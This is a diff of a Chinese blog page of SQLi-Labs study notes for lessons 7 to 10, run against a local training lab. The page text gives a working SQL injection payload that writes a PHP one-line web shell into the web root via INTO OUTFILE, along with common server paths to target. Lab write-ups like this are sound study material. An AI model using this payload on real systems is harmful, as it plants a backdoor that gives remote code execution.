@@ -87,7 +87,7 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="小知识123写入一句话木马：id=223 union select &amp;quot;&amp;lt;?php &amp;quot;,&amp;quot; @eval($_POST[&amp;apos;c&amp;apos;]);&amp;quot;, &amp;quot; ?&amp;gt;&amp;quot;  into  outfile &amp;quot;/var/www/html/mmm.php&amp;quot; 常用路径有：/var/www/, /var/www/html,">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-01-07T09:59:28.497Z">
+<meta property="og:updated_time" content="2019-01-07T10:00:42.244Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQLi-Labs学习笔记7~10">
 <meta name="twitter:description" content="小知识123写入一句话木马：id=223 union select &amp;quot;&amp;lt;?php &amp;quot;,&amp;quot; @eval($_POST[&amp;apos;c&amp;apos;]);&amp;quot;, &amp;quot; ?&amp;gt;&amp;quot;  into  outfile &amp;quot;/var/www/html/mmm.php&amp;quot; 常用路径有：/var/www/, /var/www/html,">
@@ -301,6 +301,7 @@
 
       
         <h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">写入一句话木马：</span><br><span class="line">id=223 union select &quot;&lt;?php &quot;,&quot; @eval($_POST[&apos;c&apos;]);&quot;, &quot; ?&gt;&quot;  into  outfile &quot;/var/www/html/mmm.php&quot; </span><br><span class="line">常用路径有：/var/www/, /var/www/html, /usr/local/apache2/htdocs, /var/www/nginx-default, /srv/www</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
 <h5 id="Lesson-7"><a href="#Lesson-7" class="headerlink" title="Lesson-7"></a>Lesson-7</h5><p><a href="http://127.0.0.1:8088/Less-7/?id=id=223%20union%20select%20%22%3C?php%20%22,%22%20@eval($_POST[%27c%27]);%22,%20%22%20?%3E%22%20%20into%20%20outfile%20%22/var/www/html/mmm.php%22" target="_blank" rel="noopener">http://127.0.0.1:8088/Less-7/?id=id=223%20union%20select%20%22%3C?php%20%22,%22%20@eval($_POST[%27c%27]);%22,%20%22%20?%3E%22%20%20into%20%20outfile%20%22/var/www/html/mmm.php%22</a></p>
 <p>结合提示”Use outfile”，可以知道题目可能是想让我们用导出文件的方法来做，于是我们可以写入一句话木马文件来做。</p>
 <hr>
